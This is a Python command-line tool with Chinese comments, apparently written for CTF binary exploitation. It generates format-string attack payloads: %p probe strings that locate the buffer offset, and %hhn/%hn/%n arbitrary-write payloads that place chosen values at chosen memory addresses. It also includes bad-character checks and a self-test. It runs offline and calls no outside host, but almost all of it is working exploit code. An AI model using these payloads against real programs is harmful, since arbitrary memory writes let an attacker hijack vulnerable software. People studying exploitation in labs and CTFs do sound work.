#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""格式化字符串辅助：偏移定位探测串 / %hhn %hn %n 分字节任意写 payload 生成。

纯标准库、离线：只生成文本与字节，不执行、不连接任何目标。
"""
import argparse
import struct
import sys

WIDTH_BITS = {"byte": 8, "short": 16, "int": 32, "long": 64}
WIDTH_BYTES = {"byte": 8, "short": 4, "int": 2, "long": 1}
SUFFIX = {"byte": "$hhn", "short": "$hn", "int": "$n", "long": "$ln"}
BAD_DEFAULT = b"\x00\x0a\x0d\x20"


class FmtError(ValueError):
    pass


def _num(text, name="value"):
    try:
        return int(text, 0)
    except (TypeError, ValueError):
        raise FmtError("%s 需要十六进制或十进制整数，收到 %r" % (name, text))


def parse_targets(items):
    """['0x404020=0x7f...', ...] -> [(addr, value)]，保留顺序。"""
    if not items:
        raise FmtError("至少需要一个 --write 地址=值")
    out = []
    for it in items:
        if "=" not in it:
            raise FmtError("--write 格式应为 地址=值，例如 0x404020=0x7f1234，收到 %r" % it)
        a, v = it.split("=", 1)
        addr = _num(a, "目标地址")
        val = _num(v, "写入值")
        if addr <= 0 or addr > 0xFFFF_FFFF_FFFF:
            raise FmtError("目标地址 0x%x 不合法" % addr)
        if val < 0 or val > 0xFFFF_FFFF_FFFF_FFFF:
            raise FmtError("写入值 0x%x 不合法" % val)
        out.append((addr, val))
    return out


def build_probe(offset=6, count=20, marker=b"AAAAAAAA"):
    """生成 AAAA...%<i>$p 探测串；返回 (payload, 下标列表)。"""
    if offset <= 0:
        raise FmtError("offset 必须 ≥ 1（第一个可寻址参数下标）")
    if count <= 0 or count > 200:
        raise FmtError("count 需在 1..200，收到 %r" % count)
    if not marker or b"%" in marker or b"\x00" in marker:
        raise FmtError("marker 不能为空、不能含 %% 或 \\x00")
    idx = list(range(offset, offset + count))
    payload = marker + b"." + b".".join(b"%%%d$p" % i for i in idx)
    return payload, idx


def plan_writes(targets, width="byte", limit_bytes=None):
    """把 [(addr, val)] 拆成 [(addr+i, byte, want)]，按模基数递增排序以减少输出。"""
    if width not in WIDTH_BITS:
        raise FmtError("width 只能是 %s" % "/".join(WIDTH_BITS))
    bits = WIDTH_BITS[width]
    step = WIDTH_BYTES[width]
    mask = (1 << bits) - 1
    mod = 1 << bits
    plan = []
    for addr, val in targets:
        n = limit_bytes if limit_bytes is not None else step
        if n <= 0 or n > step:
            raise FmtError("limit_bytes 需在 1..%d" % step)
        for i in range(n):
            plan.append((addr + i, (val >> (8 * i)) & 0xFF, i))
    plan.sort(key=lambda t: t[1])
    return plan, bits, mod, mask


def build_payload(offset, targets, width="byte", limit_bytes=None, check_bad=True,
                  addr_pack="q"):
    """构造 [addr...][%填充c%idx$hhn...]；返回 (payload, plan, printed)。"""
    if offset <= 0:
        raise FmtError("offset 必须 ≥ 1")
    if addr_pack not in ("q", "l", "i"):
        raise FmtError("addr_pack 只能是 q(8字节)/l(4字节,自动补0)/i(4字节)")
    plan, bits, mod, mask = plan_writes(targets, width, limit_bytes)
    unit = 8 if addr_pack == "q" else 4
    addrs = b""
    for addr, _val, _i in plan:
        if unit == 8:
            addrs += struct.pack("<Q", addr)
        else:
            if addr > 0xFFFF_FFFF:
                raise FmtError("addr_pack=4 字节时地址 0x%x 超 32 位" % addr)
            addrs += struct.pack("<I", addr)
    parts = []
    printed = 0
    for i, (addr, want, _bi) in enumerate(plan):
        idx = offset + i
        delta = (want - printed) % mod
        if delta:
            parts.append(b"%" + str(delta).encode() + b"c")
        parts.append(b"%" + str(idx).encode() + SUFFIX[width].encode())
        printed = want
    payload = addrs + b"".join(parts)
    return payload, plan, printed, bits


def enum_bad(payload, bad=BAD_DEFAULT):
    return [(i, b) for i, b in enumerate(payload) if b in bad]


def payload_stats(payload, limit=None, offset_addrs=True):
    """输出字符数 = payload 总长（地址也计入 printf 输出）。超限则 ok=False。"""
    total = len(payload)
    ok = True if limit is None else total <= limit
    return {"len": total, "printed": total, "limit": limit, "ok": ok,
            "bad": enum_bad(payload)}


def find_hit(output, marker=b"AAAAAAAA", offset=1):
    """从回显文本里找出 marker 出现的位置：返回命中的参数下标或 None。"""
    if not marker:
        raise FmtError("marker 不能为空")
    if isinstance(output, bytes):
        output = output.decode("latin-1")
    hexm = marker.hex()                      # 4141414141414141
    frags = [f for f in output.replace("\n", ".").split(".") if f]
    for i, frag in enumerate(frags, start=offset):
        low = frag.lower()
        if hexm in low:
            return i
    return None


def selftest():
    fails = []

    # 1. 正常路径：探测串结构
    probe, idx = build_probe(6, 4)
    if not probe.startswith(b"AAAAAAAA."):
        fails.append("case1: 探测串开头错 %r" % probe[:12])
    if b"%6$p" not in probe or b"%9$p" not in probe or b"%10$p" in probe:
        fails.append("case1: 下标范围错 %r" % probe)
    if idx != [6, 7, 8, 9]:
        fails.append("case1: idx=%r" % (idx,))

    # 2. 正常路径：单字节写顺序与回绕（%hhn 只取低 8 位）
    payload, plan, printed, bits = build_payload(
        8, [(0x404020, 0x7F123444CE410 if False else 0x00007F12344CE410)])
    if bits != 8:
        fails.append("case2: bits=%r" % bits)
    wants = [w for _a, w, _i in plan]
    if wants != sorted(wants):
        fails.append("case2: 未按目标字节升序 %r" % wants)
    if (0x404020, 0x10, 0) not in plan:
        fails.append("case2: 少了最低字节 0x10 @0x404020，实际 %r" % (plan,))
    if len(plan) != 8:
        fails.append("case2: 64 位值应拆成 8 个字节，实际 %d" % len(plan))
    if {a for a, _w, _i in plan} != set(range(0x404020, 0x404028)):
        fails.append("case2: 覆盖地址不连续 %r" % ([hex(a) for a, _w, _i in plan],))
    if struct.unpack("<Q", payload[:8])[0] not in set(range(0x404020, 0x404028)):
        fails.append("case2: payload 前 8 字节应是某个目标地址")

    # 3. 正常路径：%hn 只写低 2 字节（limit_bytes=2）
    payload_s, plan_s, _p, bits_s = build_payload(
        8, [(0x404020, 0x00007F12344C1234)], width="short")
    if bits_s != 16 or len(plan_s) != 4:
        fails.append("case3: %hn 应拆成 4 个半字，实际 %d / bits %r" % (len(plan_s), bits_s))
    if [w for _a, w, _i in plan_s] != sorted([w for _a, w, _i in plan_s]):
        fails.append("case3: %hn 未按半字升序")
    payload_s2, plan_s2, _p2, _b2 = build_payload(
        8, [(0x404020, 0x00007F12344C1234)], width="short", limit_bytes=1)
    if len(plan_s2) != 1 or plan_s2[0][0] != 0x404020 or plan_s2[0][1] != 0x34:
        fails.append("case3b: 只写 1 个半字应为 0x34@0x404020，实际 %r" % (plan_s2,))
    if b"$hn" not in payload_s or b"$hhn" in payload_s:
        fails.append("case3: 说明符不对 %r" % payload_s[8:])
    if any(b > 0xFF for _a, b, _i in plan_s):
        fails.append("case3: 字节超出 0..255")

    # 4. 边界：命中识别 + 长度超限
    hit = find_hit("0x7f.0x4141414141414141.0x0", marker=b"AAAAAAAA", offset=1)
    if hit != 2:
        fails.append("case4: 命中下标应为 2，实际 %r" % (hit,))
    stats = payload_stats(b"A" * 200, limit=128)
    if stats["ok"] or stats["len"] != 200:
        fails.append("case4b: 超限判定错 %r" % (stats,))

    # 5. 边界拒绝：坏输入
    bad_cases = [
        ("offset=0", lambda: build_probe(0, 4)),
        ("count=0", lambda: build_probe(6, 0)),
        ("count 过大", lambda: build_probe(6, 500)),
        ("marker 含 %", lambda: build_probe(6, 4, b"%AA")),
        ("width 非法", lambda: build_payload(8, [(0x404020, 1)], width="quad")),
        ("--write 缺等号", lambda: parse_targets(["0x404020"])),
        ("地址为 0", lambda: parse_targets(["0x0=1"])),
        ("值越界", lambda: parse_targets(["0x404020=0x1ffffffffffffffff"])),
        ("4字节地址越界", lambda: build_payload(8, [(0x7F0000000000, 1)], addr_pack="i")),
        ("limit 超宽", lambda: build_payload(8, [(0x404020, 1)], width="short", limit_bytes=8)),
        ("limit 为 0", lambda: build_payload(8, [(0x404020, 1)], width="byte", limit_bytes=0)),
        ("空目标", lambda: parse_targets([])),
    ]
    for name, bad in bad_cases:
        try:
            bad()
            fails.append("case5: %s 未被拒绝" % name)
        except FmtError:
            pass

    # 6. 参数不足：独立 parser 复现 exit 2
    tiny = argparse.ArgumentParser(prog="pwn_format_string", add_help=False)
    tiny.exit = lambda status=0, message=None: (_ for _ in ()).throw(SystemExit(status))
    tiny._print_message = lambda message, file=None: None
    tiny.add_argument("--x")
    try:
        tiny.error("需要 --probe 或 --write；或用 --selftest")
        fails.append("case6: ap.error 未抛 SystemExit")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case6: 退出码 %r" % (e.code,))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 6/6（探测串、%hhn排序与回绕、%hn只写2字节、命中识别与超限、坏输入拒绝、参数不足）")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="格式化字符串：偏移探测串与 %hhn/%hn 任意写 payload（离线）")
    ap.add_argument("--probe", action="store_true", help="生成偏移定位探测串")
    ap.add_argument("--write", action="append", metavar="ADDR=VAL", help="写入目标，可多次")
    ap.add_argument("--offset", type=lambda s: int(s, 0), default=8, help="格式串起始参数下标")
    ap.add_argument("--count", type=lambda s: int(s, 0), default=20, help="探测的 %%n$p 个数")
    ap.add_argument("--width", choices=list(WIDTH_BITS), default="byte", help="写宽：byte(%%hhn)/short(%%hn)/int(%%n)")
    ap.add_argument("--bytes", type=lambda s: int(s, 0), default=None, help="只写低 N 字节（默认按 width）")
    ap.add_argument("--addr-pack", choices=["q", "l", "i"], default="q", help="地址编码宽度")
    ap.add_argument("--limit", type=lambda s: int(s, 0), default=None, help="输入长度上限（字节）")
    ap.add_argument("--hex", action="store_true", help="payload 用十六进制输出")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    try:
        if args.probe:
            payload, idx = build_probe(args.offset, args.count)
            print("[*] 探测串（%d 字节，下标 %d..%d）：" % (len(payload), idx[0], idx[-1]))
            print(payload.decode("latin-1"))
            print("[*] 回显里出现 0x4141414141414141 的那个 %%N$p 即缓冲区下标")
            return 0
        if not args.write:
            ap.error("需要 --probe 或 --write；或用 --selftest")
        targets = parse_targets(args.write)
        payload, plan, printed, bits = build_payload(
            args.offset, targets, width=args.width, limit_bytes=args.bytes,
            addr_pack=args.addr_pack)
        print("[*] 写入计划（%s，%d 组）：" % (args.width, len(plan)))
        for addr, want, bi in plan:
            print("    0x%x <- %d(0x%02x)  第 %d 字节" % (addr, want, want, bi))
        stats = payload_stats(payload, args.limit)
        print("[*] payload %d 字节，printf 将输出 %d 字符，上限 %r -> %s"
              % (stats["len"], stats["printed"], stats["limit"], "OK" if stats["ok"] else "超限！需拆分"))
        if stats["bad"]:
            print("[*] 受限字符 %d 处（前 3 个）：%r" % (len(stats["bad"]), stats["bad"][:3]))
        if args.hex:
            print(payload.hex())
        else:
            print(payload.decode("latin-1"))
        return 0
    except FmtError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
